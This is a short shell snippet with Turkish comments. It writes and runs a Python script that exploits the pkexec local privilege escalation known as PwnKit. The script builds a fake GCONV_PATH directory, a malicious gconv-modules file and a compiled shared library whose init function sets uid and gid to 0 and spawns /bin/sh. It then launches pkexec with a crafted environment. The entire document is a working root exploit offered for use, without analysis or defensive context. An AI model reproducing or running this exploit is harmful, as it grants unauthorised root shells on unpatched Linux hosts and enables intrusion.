cat << 'EOF' > /tmp/pwnkit.py
import os

# Sahte bir GCONV dizini ve dosyası oluşturuyoruz
os.system('mkdir -p "GCONV_PATH=."')
os.system('touch "GCONV_PATH=./pwnkit"')
os.system('chmod a+x "GCONV_PATH=./pwnkit"')
os.system('mkdir -p pwnkit')

# Zararlı gconv-modules dosyasını yaz
with open("pwnkit/gconv-modules", "w") as f:
    f.write("module UTF-8// PWNKIT// pwnkit 2\n")

# Zararlı C kodunu yaz ve derle (Shared Library)
with open("pwnkit/pwnkit.c", "w") as f:
    f.write("""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    setgroups(0);
    execl("/bin/sh", "sh", NULL);
}
""")

# Kütüphaneyi derle
os.system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC")

# Exploit'i tetikle
env = { "CHARSET": "PWNKIT", "SHELL": "pwnkit", "PATH": os.environ["PATH"] }
os.execve("/usr/bin/pkexec", ["/usr/bin/pkexec"], env)
EOF

# Çalıştır
python3 /tmp/pwnkit.py
